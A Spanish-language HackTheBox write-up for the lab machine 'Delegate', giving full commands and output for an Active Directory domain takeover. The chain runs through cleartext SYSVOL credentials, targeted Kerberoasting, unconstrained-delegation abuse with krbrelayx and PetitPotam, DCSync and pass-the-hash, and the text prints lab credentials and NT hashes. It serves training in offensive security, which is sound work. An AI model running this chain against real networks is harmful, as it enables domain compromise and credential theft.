---
title: "HTB: Delegate"
date: 2026-04-20 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, Kerberos, Unconstrained-Delegation, PetitPotam, krbrelayx, DCSync, WriteOwner, Kerberoasting, SeEnableDelegationPrivilege]
image:
  path: /assets/img/Delegate/delegate.png
  alt: HackTheBox Delegate Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Delegate** es una máquina de **HackTheBox** de dificultad **Media** enfocada en entornos
de **Active Directory**. El acceso inicial se obtiene enumerando un recurso compartido
**SYSVOL** accesible como `guest`, donde se encuentra un script de batch (`users.bat`) que
contiene credenciales en texto claro para el usuario `A.Briggs`. A través de **BloodHound**
se identifica que `A.Briggs` tiene `WriteOwner` sobre `N.Thompson`, lo que permite asignarle
un **SPN falso** y realizar **Kerberoasting** para obtener su contraseña. Con `N.Thompson` se
accede por **WinRM** y se detectan los privilegios `SeEnableDelegationPrivilege` y
`SeMachineAccountPrivilege`. La escalada explota **Unconstrained Delegation**: se crea una
máquina falsa `LEXO$`, se configura como delegación irrestricta, se añade un registro DNS
y se fuerza al DC a autenticarse hacia nuestra máquina con **PetitPotam**, capturando su
**TGT** con **krbrelayx**. Ese ticket se usa para ejecutar **DCSync** y comprometer el dominio
completamente.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.234.69
```

```
64 bytes from 10.129.234.69: icmp_seq=1 ttl=127 time=120 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                  |
|--------|--------|---------------------------|
| 53     | open   | Simple DNS Plus           |
| 88     | open   | Kerberos                  |
| 135    | open   | MS RPC                    |
| 139    | open   | NetBIOS                   |
| 389    | open   | LDAP (AD)                 |
| 445    | open   | SMB                       |
| 464    | open   | Kpasswd5                  |
| 593    | open   | RPC over HTTP             |
| 636    | open   | LDAPS                     |
| 3268   | open   | LDAP Global Catalog       |
| 3269   | open   | LDAPS Global Catalog      |
| 3389   | open   | RDP                       |
| 5985   | open   | WinRM (HTTP)              |
| 9389   | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP** y **SMB**, lo que confirma que el host corresponde a un **Controlador
de Dominio** dentro del entorno `delegate.vl`.

- **Firma SMB habilitada:** Descarta ataques de retransmisión **NTLM** clásicos como
  Responder + ntlmrelayx.
- **RDP en 3389:** Permite acceso gráfico si se obtienen credenciales válidas.
- **WinRM en 5985:** Permite acceso remoto por línea de comandos con credenciales válidas.
- **Desfase horario mínimo:** El skew detectado es de apenas 1 minuto, dentro del margen
  tolerado por **Kerberos** (5 minutos). No será necesario sincronizar el reloj.

---

## Enumeración sin credenciales

### Enumeración vía Kerberos

Sin credenciales, podemos verificar la existencia de usuarios mediante **Kerberos**. El KDC
responde de forma diferente ante usuarios válidos e inválidos, lo que permite enumerarlos
sin autenticación:

```bash
kerbrute userenum -d delegate.vl --dc $IP /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

```
[+] VALID USERNAME: guest@delegate.vl
[+] VALID USERNAME: administrator@delegate.vl
Done! Tested 17 usernames (2 valid) in 0.254 seconds
```

La cuenta `guest` es un punto de entrada valioso en entornos Windows porque, aunque no
tiene privilegios, puede autenticarse contra SMB y acceder a recursos compartidos de lectura
pública como `NETLOGON` y `SYSVOL`.

### Enumeración de recursos compartidos como Guest

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

```
SMB  10.129.234.69  445  DC1  [+] delegate.vl\guest:
SMB  10.129.234.69  445  DC1  Share       Permissions   Remark
SMB  10.129.234.69  445  DC1  ADMIN$                    Remote Admin
SMB  10.129.234.69  445  DC1  C$                        Default share
SMB  10.129.234.69  445  DC1  IPC$        READ          Remote IPC
SMB  10.129.234.69  445  DC1  NETLOGON    READ          Logon server share
SMB  10.129.234.69  445  DC1  SYSVOL      READ          Logon server share
```

Los recursos `NETLOGON` y `SYSVOL` son compartidos predeterminados de **Active Directory**
que almacenan scripts de inicio de sesión y políticas de grupo. En entornos mal administrados,
es común encontrar scripts con credenciales hardcodeadas. Procedemos a inspeccionarlos:

```bash
nxc smb $IP -u 'guest' -p '' --share 'SYSVOL' -M spider_plus -o SHARE=SYSVOL
```

```json
{
    "NETLOGON": {
        "users.bat": {
            "atime_epoch": "2023-08-26 07:54:29",
            "ctime_epoch": "2023-08-26 07:45:24",
            "mtime_epoch": "2023-10-01 04:08:32",
            "size": "159 B"
        }
    },
    "SYSVOL": {
        "delegate.vl/scripts/users.bat": {
            "size": "159 B"
        }
    }
}
```

Se detecta un archivo `users.bat` en el directorio de scripts del dominio. Los scripts en
`SYSVOL/scripts` son ejecutados automáticamente al iniciar sesión los usuarios del dominio.
Es un lugar frecuente para credenciales hardcodeadas. Lo descargamos:

```bash
nxc smb $IP -u 'guest' -p '' --share 'SYSVOL' --get-file 'delegate.vl/scripts/users.bat' './users.bat'
```

```
SMB  10.129.234.69  445  DC1  [+] File "delegate.vl/scripts/users.bat" was downloaded to "./users.bat"
```

```bash
cat users.bat
```

```batch
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

> El script mapea una unidad de red usando las credenciales de `A.Briggs` con la contraseña
> `P4ssw0rd1#123` en texto claro. Esto es un error de seguridad crítico: cualquier usuario
> con acceso a `SYSVOL` puede leer este archivo.

Verificamos que las credenciales son válidas:

```bash
nxc smb $IP -u 'A.Briggs' -p 'P4ssw0rd1#123'
```

```
SMB  10.129.234.69  445  DC1  [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

---

## Análisis de Dominio — BloodHound

Recopilamos información del dominio con las credenciales de `A.Briggs` para identificar
rutas de ataque y posibles escaladas de privilegios:

```bash
bloodhound-ce-python -u 'A.Briggs' -p 'P4ssw0rd1#123' -d delegate.vl -ns $IP -c All --zip
```

**BloodHound** recopila todos los objetos del dominio (usuarios, grupos, GPOs, ACLs,
sesiones, delegaciones) y construye un grafo de relaciones que permite visualizar rutas de
ataque que serían invisibles analizando objetos individualmente.

---

## WriteOwner: A.Briggs → N.Thompson

### ¿Qué es WriteOwner y por qué es tan poderoso?

En Windows y Active Directory, cada objeto del directorio tiene un **propietario** (Owner)
almacenado en su **descriptor de seguridad**. Este propietario tiene una capacidad implícita
que no aparece en las ACLs normales: puede **modificar las ACLs del propio objeto** en
cualquier momento, independientemente de lo que digan los permisos configurados.

El permiso `WriteOwner` permite **cambiar quién es el propietario** de un objeto. Si podemos
convertirnos en propietarios, automáticamente obtenemos la capacidad de reescribir las ACLs
de ese objeto, lo que nos permite otorgarnos `GenericAll` y tomar control total.

**¿Por qué el ataque tiene dos pasos?**

`WriteOwner` por sí solo **no da control directo** sobre el objeto. El flujo es:

1. Usar `WriteOwner` para **tomar propiedad** del objeto objetivo.
2. Usar esa propiedad para **escribir un ACE** que nos otorgue `GenericAll`.
3. Con `GenericAll`, ejecutar el ataque final (en este caso, Kerberoasting).

En lugar de pasar por todos esos pasos de forma manual, optamos por una ruta más directa:
asignar un **SPN falso** a `N.Thompson` directamente usando `WriteOwner`, lo que nos permite
realizar **Targeted Kerberoasting** sin necesitar modificar las ACLs.

BloodHound revela que `A.Briggs` tiene `WriteOwner` sobre `N.Thompson`:

![WriteOwner](/assets/img/Delegate/genericwrite.png)

### 1. Asignar un SPN falso a N.Thompson

Para que el KDC emita un **Ticket de Servicio (TGS)** para `N.Thompson`, necesitamos que
tenga un **SPN** registrado. Asignamos uno arbitrario usando nuestros permisos:

```bash
bloodyAD --host dc1.delegate.vl --dc-ip $IP -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' set object N.thompson serviceprincipalname -v 'STS/fake.delegate.vl'
```

```
[+] N.thompson's servicePrincipalName has been updated
```

### 2. Solicitar el TGS — Kerberoasting

**Kerberoasting** abusa del protocolo Kerberos: cualquier usuario autenticado en el dominio
puede solicitar un **Ticket de Servicio (TGS)** para cualquier SPN registrado en el dominio.
El KDC emite ese ticket cifrado con el hash NTLM de la cuenta que tiene el SPN. No se
necesitan privilegios especiales — el KDC no verifica si realmente vas a usar el servicio.

El TGS está cifrado con **RC4** (o AES, pero RC4 es crackeable más rápido offline):

```bash
GetUserSPNs.py delegate.vl/A.Briggs:'P4ssw0rd1#123' -dc-ip $IP -request
```

```
ServicePrincipalName  Name        MemberOf
--------------------  ----------  -----------------------------------------------
STS/fake.delegate.vl  N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl

$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$80c85add70a08ed0799a3e89...
```

> Nota importante: BloodHound muestra que `N.Thompson` es miembro de **delegation admins**,
> un grupo que tiene permisos privilegiados en el dominio. Comprometer esta cuenta es
> especialmente valioso.

### 3. Crackear el hash offline con Hashcat

El tipo `-m 13100` corresponde a **Kerberos 5 TGS-REP etype 23 (RC4)**:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*N.Thompson$DELEGATE.VL$...:KALEB_2341
```

**Contraseña:** `KALEB_2341`

Verificamos las credenciales:

```bash
nxc smb $IP -u 'N.thompson' -p 'KALEB_2341'
```

```
SMB  10.129.234.69  445  DC1  [+] delegate.vl\N.thompson:KALEB_2341
```

---

## Acceso Inicial — Evil-WinRM como N.Thompson

BloodHound confirma que `N.Thompson` es miembro de **Remote Management Users**, lo que
le permite conectarse remotamente mediante **WinRM**:

![Remote Management](/assets/img/Delegate/grupo.png)

```bash
evil-winrm -i $IP -u 'N.Thompson' -p 'KALEB_2341'
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\N.Thompson> type Desktop\user.txt
0a641d5bf5b06bdcf1b7a4912e663c36
```

---

## Escalada de Privilegios — Unconstrained Delegation Abuse

### Análisis de privilegios

Lo primero que hacemos al obtener acceso es revisar los privilegios del usuario actual:

```powershell
*Evil-WinRM* PS C:\Users\N.Thompson> whoami /priv
```

```
Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

Tenemos dos privilegios extremadamente poderosos combinados:

**`SeMachineAccountPrivilege`** permite crear cuentas de equipo (`MACHINE$`) en el dominio.
Por defecto en AD, cualquier usuario puede crear hasta 10 máquinas (controlado por
`ms-DS-MachineAccountQuota`), pero este privilegio lo garantiza explícitamente. Las cuentas
de equipo son cuentas de AD completamente funcionales con SPNs automáticos, lo que las
hace perfectas para ataques Kerberos.

**`SeEnableDelegationPrivilege`** permite **configurar la delegación Kerberos** sobre objetos
de Active Directory. En términos prácticos, permite marcar cualquier cuenta como
`TRUSTED_FOR_DELEGATION` (**Unconstrained Delegation**), lo que hace que el KDC incluya
automáticamente los **TGTs de los usuarios** en los tickets de servicio que esa cuenta recibe.

La combinación de ambos privilegios es devastadora: podemos crear una máquina bajo nuestro
control, configurarla con Unconstrained Delegation, y forzar al DC a autenticarse hacia ella
para capturar su TGT y ejecutar DCSync.

### ¿Qué es Unconstrained Delegation y por qué es tan peligrosa?

La **delegación sin restricciones (Unconstrained Delegation)** es una característica de
Kerberos diseñada para arquitecturas de múltiples capas. Cuando una cuenta tiene este flag
configurado, el KDC incluye automáticamente el **TGT completo del usuario** dentro del TGS
que ese usuario le envía al servicio. Esto permite al servicio actuar como el usuario frente
a **cualquier otro servicio** del dominio — de ahí "sin restricciones".

**¿Por qué es explotable?**

Si un **Domain Controller** se autentica hacia un servicio con Unconstrained Delegation
(por ejemplo, porque un atacante lo forzó usando **PetitPotam** o **PrinterBug**), el KDC
incluye el **TGT de la cuenta del DC** (`DC1$`) en el ticket. El servicio receptor (nuestra
máquina maliciosa) puede extraer ese TGT y usarlo para impersonar al DC, incluyendo ejecutar
**DCSync**.

**Diferencia con Constrained Delegation:**
- **Constrained (KCD):** Solo puede delegar a servicios específicos en una lista blanca.
- **Unconstrained:** Puede impersonar al usuario frente a **cualquier** servicio. Sin límites.

### Estrategia del ataque

```
[Nosotros]
    │
    │ 1. Creamos LEXO$ con SeMachineAccountPrivilege
    │ 2. Configuramos LEXO$ con TRUSTED_FOR_DELEGATION
    │ 3. Añadimos DNS: Lexo.delegate.vl → nuestra IP
    │ 4. Registramos SPN HOST/Lexo.delegate.vl en LEXO$
    │ 5. Levantamos krbrelayx escuchando en nuestra IP
    ▼
[PetitPotam] → fuerza a DC1 a autenticarse hacia Lexo.delegate.vl
    │
    │ DC1 intenta autenticarse → Kerberos → KDC emite TGS para HOST/Lexo
    │ KDC incluye el TGT de DC1$ dentro del TGS (por Unconstrained Delegation)
    ▼
[krbrelayx] captura el TGT de DC1$@DELEGATE.VL
    │
    │ Usamos el TGT de DC1$ para ejecutar DCSync
    ▼
[secretsdump] → obtenemos todos los hashes del dominio
```

### 1. Crear cuenta de equipo LEXO$

```bash
addcomputer.py -method SAMR -computer-name 'LEXO$' -computer-pass 'Password!' -dc-ip $IP 'delegate.vl/N.THOMPSON:KALEB_2341'
```

```
[*] Successfully added machine account LEXO$ with password Password!.
```

### 2. Configurar Unconstrained Delegation en LEXO$

Marcamos `LEXO$` con el flag `TRUSTED_FOR_DELEGATION`. Esto hace que el KDC incluya los
TGTs completos de los usuarios en los tickets que envíen a `LEXO$`:

```bash
bloodyAD --host $IP -d delegate.vl -u 'N.THOMPSON' -p 'KALEB_2341' add uac 'LEXO$' -f TRUSTED_FOR_DELEGATION
```

```
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to LEXO$'s userAccountControl
```

### 3. Añadir registro DNS apuntando a nuestra IP

Para que el DC pueda resolver `Lexo.delegate.vl` y autenticarse hacia nuestra máquina,
necesitamos un registro DNS en el servidor del dominio. Usamos `dnstool.py` para escribir
directamente en las zonas DNS de AD via LDAP:

```bash
dnstool.py -u 'delegate.vl\N.thompson' -p 'KALEB_2341' -a add -r 'Lexo.delegate.vl' -d 10.10.14.116 --action add DC1.delegate.vl -dns-ip $IP
```

```
[+] LDAP operation completed successfully
```

Verificamos que el registro DNS funciona correctamente:

```bash
nslookup Lexo.delegate.vl $IP
```

```
Name:    Lexo.delegate.vl
Address: 10.10.14.116
```

### 4. Registrar SPN en LEXO$

Para que el DC use **Kerberos** (en lugar de NTLM) al autenticarse hacia `Lexo.delegate.vl`,
necesitamos que exista un SPN registrado. Sin SPN, el KDC no puede emitir un ticket Kerberos
para ese host y recurrirá a NTLM, que no nos sirve para capturar el TGT:

```bash
addspn.py -u 'delegate\N.THOMPSON' -p 'KALEB_2341' -s HOST/Lexo.delegate.vl -t 'LEXO$' -dc-ip $IP dc1.delegate.vl
```

```
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

### 5. Calcular el hash NT de LEXO$

**krbrelayx** necesita el hash NT de `LEXO$` para descifrar los tickets Kerberos recibidos.
Como conocemos la contraseña, la calculamos directamente:

```bash
python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Password!').hex())"
```

```
fbdcd5041c96ddbd82224270b57f11fc
```

### 6. Levantar krbrelayx como listener Kerberos

**krbrelayx** actúa como un servidor Kerberos legítimo. Cuando el DC intente autenticarse
hacia `Lexo.delegate.vl`, enviará un TGS que contiene el TGT de `DC1$` incrustado (por
Unconstrained Delegation). `krbrelayx` descifra el TGS usando el hash NT de `LEXO$` y
extrae el TGT del DC:

```bash
sudo krbrelayx -hashes :fbdcd5041c96ddbd82224270b57f11fc --interface-ip 10.10.14.116
```

```
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up DNS Server
[*] Servers started, waiting for connections
```

### 7. Forzar autenticación del DC con PetitPotam

**PetitPotam** explota la interfaz **MS-EFSRPC** (Encrypting File System Remote Protocol)
de Windows para forzar a una máquina a autenticarse hacia un host arbitrario. El objetivo
no necesita tener EFS activo — la función `EfsRpcOpenFileRaw` puede activar la autenticación
aunque el servicio esté deshabilitado.

Al pasarle `Lexo.delegate.vl` como destino, el DC intentará autenticarse hacia nuestra
máquina. Como `Lexo.delegate.vl` tiene un SPN registrado, el DC usará Kerberos e incluirá
su TGT en el proceso:

```bash
python3 PetitPotam.py -u 'N.Thompson' -p 'KALEB_2341' -d 'delegate.vl' Lexo.delegate.vl $IP
```

```
[+] Attack worked!
```

En la terminal de **krbrelayx** observamos la captura del ticket:

```
[*] SMBD: Received connection from 10.129.22.70
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

> Se capturó el TGT de `DC1$`. Este ticket representa la identidad completa del Domain
> Controller en el dominio. Con él podemos hacer cualquier cosa que un DC pueda hacer,
> incluyendo solicitar la replicación de credenciales mediante DCSync.

### 8. Verificar el ticket capturado

```bash
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
klist
```

```
Default principal: DC1$@DELEGATE.VL

Valid starting       Expires              Service principal
04/20/2026 17:50:24  04/21/2026 02:36:03  krbtgt/DELEGATE.VL@DELEGATE.VL
    renew until 04/27/2026 16:36:03
```

### 9. DCSync — Volcar todos los hashes del dominio

**DCSync** abusa del protocolo de replicación de Active Directory (**MS-DRSR**). Los Domain
Controllers se replican entre sí constantemente para mantener coherencia, incluyendo la
sincronización de los hashes de contraseñas de todos los objetos del dominio.

Si una cuenta tiene los permisos `DS-Replication-Get-Changes` y
`DS-Replication-Get-Changes-All`, puede solicitar al DC que le envíe los datos de
replicación. Los DCs legítimos tienen estos permisos entre sí, y como estamos impersonando
a `DC1$`, tenemos exactamente esos permisos:

```bash
secretsdump.py -k -no-pass DC1.delegate.vl
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
LEXO$:4601:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
[*] Cleaning up...
```

**NT Hash del Administrador:** `c32198ceab4cc695e65045562aa3ee93`

---

## Acceso Final como Administrador

Usamos el hash obtenido para autenticarnos como `Administrator` mediante **Pass-The-Hash**:

```bash
evil-winrm -i $IP -u 'administrator' -H 'c32198ceab4cc695e65045562aa3ee93'
```

### Flag de root

```powershell
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
f5fa58723c6ecbfa28607a00cc0b7b40
```

**¡Máquina comprometida con éxito!**